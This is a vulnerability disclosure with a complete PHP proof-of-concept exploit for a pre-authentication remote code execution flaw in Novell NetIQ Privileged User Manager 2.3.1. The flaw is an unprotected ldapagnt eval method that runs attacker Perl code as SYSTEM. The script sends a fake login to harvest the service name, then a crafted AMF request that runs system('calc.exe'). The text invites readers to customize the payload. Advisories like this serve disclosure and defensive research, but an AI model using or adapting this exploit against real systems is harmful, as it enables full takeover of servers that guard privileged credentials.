@@ -1,0 +1,221 @@
+Novell NetIQ Privileged User Manager 2.3.1 ldapagnt.dll ldapagnt_eval() 
+Perl Code Evaluation RCE (pre auth/SYSTEM)
+
+Tested against: Microsoft Windows 2003 r2 sp2
+download url: http://download.novell.com/index.jsp
+(search "Privileged User Manager")
+file tested: NetIQ-PUM-2.3.1.iso
+(decompress and launch netiq_pum_manager_2.3.1_x86.msi)
+
+Background:
+The mentioned product installs a Windows service (unifid.exe) called 'npum',
+display name: "NetIQ Privileged User Manager" which listens on 
+default tcp port 443 (https) for incoming connections.
+
+Vulnerabilty:
+The secure web interface contains a flaw which allows, without prior 
+authentication, to execute a Perl script with SYSTEM privileges.
+This can be done by sending a POST request with well formed
+data.
+
+Example data:
+  0 : 00 00 00 00 00 01 00 14 53 50 46 2e 55 74 69 6c [........SPF.Util]
+ 10 : 2e 63 61 6c 6c 4d 6f 64 75 6c 65 41 00 00 00 00 [.callModuleA....]
+ 20 : 02 0a 0a 00 00 00 01 03 00 03 70 6b 74 03 00 06 [..........pkt...]
+ 30 : 6d 65 74 68 6f 64 02 00 04 65 76 61 6c 00 06 6d [method...eval..m]
+ 40 : 6f 64 75 6c 65 02 00 08 6c 64 61 70 61 67 6e 74 [odule...ldapagnt]
+ 50 : 00 04 45 76 61 6c 03 00 07 63 6f 6e 74 65 6e 74 [..Eval...content]
+ 60 : 02 00 17 73 79 73 74 65 6d 28 22 63 61 6c 63 2e [...system("calc.]
+ 70 : 65 78 65 22 29 3b 0a 0a 31 3b 0a 0a 31 3b 00 00 [exe");..1;..1;..]
+ 80 : 09 00 00 09 00 03 75 69 64 02 00 00 00 00 09 00 [......uid.......]
+ 90 : 08 73 76 63 5f 6e 61 6d 65 02 00 06 61 6e 64 72 [.svc_name...andr]
+ A0 : 65 61 00 00 09 [ea...]
+
+Note that the uid argument is empty.
+
+Explaination:
+
+Open C:\Program Files\Novell\npum\service\local\ldapagnt\module.xml
+(this is the configuration file of the 'ldapagnt' module).
+
+...
+    <Library type="dso" lib="lib/ldapagnt">
+      <Method name="init_ldap_cred" init="init_ldapcred" /> 
+      <Method name="eval" svc="ldapagnt_eval" />       <--------------------------
+    </Library>
+...
+
+no role is defined for the eval() method which corresponds to 
+the ldapagnt_eval() function inside ldapagnt.dll.
+
+As attachment, proof of concept code, which launches calc.exe 
+from remote. Customize the shellcode for your own use.
+
+PoC:
+
+<?php
+/*
+Novell NetIQ Privileged User Manager 2.3.1 ldapagnt.dll ldapagnt_eval() Remote 
+Perl Code Evaluation RCE (pre auth/SYSTEM)
+
+rgod
+*/
+    error_reporting(E_ALL ^ E_NOTICE);     
+    set_time_limit(0);
+    $err[0] = "[!] This script is intended to be launched from the cli!";
+    $err[1] = "[!] You need the curl extesion loaded!";
+    if (php_sapi_name() <> "cli") {
+        die($err[0]);
+    }
+    
+    function syntax() {
+       print("usage: php 9sg_novell_netiq_ii.php [ip_address]\r\n" );
+       die();
+    }
+    
+    $argv[1] ? print("[*] Attacking ...\n") :
+    syntax();
+    
+	if (!extension_loaded('curl')) {
+        $win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? true :
+        false;
+        if ($win) {
+            !dl("php_curl.dll") ? die($err[1]) :
+             print("[*] curl loaded\n");
+        } else {
+            !dl("php_curl.so") ? die($err[1]) :
+             print("[*] curl loaded\n");
+        }
+    }
+        
+    function _s($url, $is_post, $ck, $request) {
+        global $_use_proxy, $proxy_host, $proxy_port;
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        if ($is_post) {
+            curl_setopt($ch, CURLOPT_POST, 1);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $request);
+        }
+        curl_setopt($ch, CURLOPT_HEADER, 1);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+            "Cookie: ".$ck,
+            "Content-Type: application/x-amf", //do not touch this, important
+            "x-flash-version: 11,4,402,278"
+        )); 
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; BOIE9;ENUSMSCOM)");
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+         
+        if ($_use_proxy) {
+            curl_setopt($ch, CURLOPT_PROXY, $proxy_host.":".$proxy_port);
+        }
+        $_d = curl_exec($ch);
+        if (curl_errno($ch)) {
+            //die("[!] ".curl_error($ch)."\n");
+        } else {
+            curl_close($ch);
+        }
+        return $_d;
+    }
+
+        /*********************************** config **********************************/
+          $host = $argv[1];
+          $port = 443;
+          $code="system(\"calc.exe\");";
+          $identity="";
+        /*****************************************************************************/
+
+function hex_dump($data, $newline="\n") { 
+static $from = '';   
+static $to = '';    
+static $width = 16; static $pad = '.';  
+ if ($from==='')   {     
+     for ($i=0; $i<=0xFF; $i++)  { 
+         $from .= chr($i);       
+         $to .= ($i >= 0x20 && $i <= 0x7E) ? chr($i) : $pad;   
+     }   
+ }    
+$hex = str_split(bin2hex($data), $width*2);   
+$chars = str_split(strtr($data, $from, $to), $width);    
+$offset = 0;   
+foreach ($hex as $i => $line)   {     
+    echo sprintf('%6X',$offset).' : '.implode(' ', str_split($line,2)) . ' [' . $chars[$i] . ']' . $newline;     $offset += $width;   
+  } 
+sleep(1);
+}       
+
+print("[*] I need the service name, fake login request ...\n");
+$data=
+"\x00\x00\x00\x00\x00\x01\x00\x15\x53\x50\x46\x2e\x55\x74".         //  ..........SPF.Ut
+"\x69\x6c\x2e\x63\x61\x6c\x6c\x4d\x6f\x64\x75\x6c\x65\x45\x78\x00". //  il.callModuleEx.
+"\x02\x2f\x34\x00\x00\x00\x64\x0a\x00\x00\x00\x01\x03\x00\x03\x70". //  ./4...d........p
+"\x6b\x74\x03\x00\x0b\x43\x72\x65\x64\x65\x6e\x74\x69\x61\x6c\x73". //  kt...Credentials
+"\x03\x00\x04\x6e\x61\x6d\x65\x02\x00\x04\x74\x65\x73\x74\x00\x06". //  ...name...test..
+"\x70\x61\x73\x73\x77\x64\x02\x00\x04\x74\x65\x73\x74\x00\x00\x09". //  passwd...test...
+"\x00\x06\x6d\x65\x74\x68\x6f\x64\x02\x00\x05\x6c\x6f\x67\x69\x6e". //  ..method...login
+"\x00\x06\x6d\x6f\x64\x75\x6c\x65\x02\x00\x04\x61\x75\x74\x68\x00". //  ..module...auth.
+"\x03\x75\x69\x64\x06\x00\x00\x09\x00\x00\x09";                     //  .uid.......
+print(hex_dump($data)."\n");
+$url = "https://$host:$port/";
+$out = _s($url, 1, "", $data);
+print(hex_dump($out)."\n");
+$tmp=explode("svc",$out);$tmp=$tmp[1];$len=unpack("n",$tmp[1].$tmp[2]);
+$svc_name="";
+for ($i=0; $i<$len[1]; $i++){
+  $svc_name.=$tmp[$i + 3];
+}
+echo "[*] svc_name -> ".$svc_name."\n";
+
+$data=
+"\x00\x00\x00\x00\x00\x01".
+"\x00\x14".
+"SPF.Util.callModuleA".
+"\x00\x00".
+"\x00".
+"\x00\x02".
+"\x0a\x0a". //whatever
+"\x00\x00\x00\x01\x03".
+"\x00\x03".
+"pkt".
+"\x03".
+"\x00\x06".
+"method".
+"\x02".
+"\x00\x04".
+"eval".
+"\x00\x06".
+"module".
+"\x02".
+"\x00\x08".
+"ldapagnt".
+"\x00\x04".
+"Eval".
+"\x03".
+"\x00\x07".
+"content".
+"\x02".
+pack("n",strlen($code) + 4).
+$code.
+"\x0a\x0a1;\x0a\x0a1;".
+"\x00\x00\x09".
+"\x00\x00\x09".
+"\x00\x03".
+"uid".
+"\x02".
+pack("n",strlen($identity)).
+$identity.
+"\x00\x00\x09".
+"\x00\x08".
+"svc_name".
+"\x02".
+pack("n",strlen($svc_name)).
+$svc_name.
+"\x00\x00\x09";
+
+print(hex_dump($data)."\n");
+$url = "https://$host:$port/";
+$out = _s($url, 1, "", $data);
+print(hex_dump($out)."\n");
+?>
